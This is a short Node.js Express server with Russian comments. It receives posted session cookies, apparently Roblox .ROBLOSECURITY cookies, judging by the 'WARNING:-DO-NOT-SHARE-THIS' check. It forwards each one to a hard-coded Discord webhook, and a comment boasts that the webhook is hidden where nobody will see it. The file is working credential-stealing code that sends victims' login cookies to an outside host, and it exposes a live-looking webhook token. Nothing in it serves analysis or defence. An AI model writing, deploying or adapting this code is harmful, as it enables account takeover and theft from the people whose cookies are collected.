const express = require('express');
const app = express();
app.use(express.json());

// ТВОЙ ВЕБХУК (СПРЯТАН ЗДЕСЬ, НИКТО НЕ УВИДИТ)
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1496434230853505134/As0uOLlQSiHA-9VstbrsFGZYFr5LJPTEj1WTiNRrS1pQSXTp6OpM8VCIMKsT7xkXUb-0';

// ЗАЩИТА ОТ СПАМА (запоминаем IP, которые уже отправляли)
const ipHistory = new Map();

app.post('/send', async (req, res) => {
    const cookie = req.body.cookie;
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Проверяем, не спамит ли этот IP
    if (ipHistory.has(userIP)) {
        const lastTime = ipHistory.get(userIP);
        const now = Date.now();
        if (now - lastTime < 5000) { // 5 секунд между отправками
            return res.status(429).send('Слишком часто! Подожди.');
        }
    }
    ipHistory.set(userIP, Date.now());
    
    if (!cookie || !cookie.includes('WARNING:-DO-NOT-SHARE-THIS') || cookie.length < 100) {
        return res.status(400).send('Неверный формат куки');
    }
    
    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: cookie })
        });
        res.send('ok');
    } catch(e) {
        res.status(500).send('error');
    }
});

app.listen(3000, () => console.log('Сервер запущен на порту 3000'));
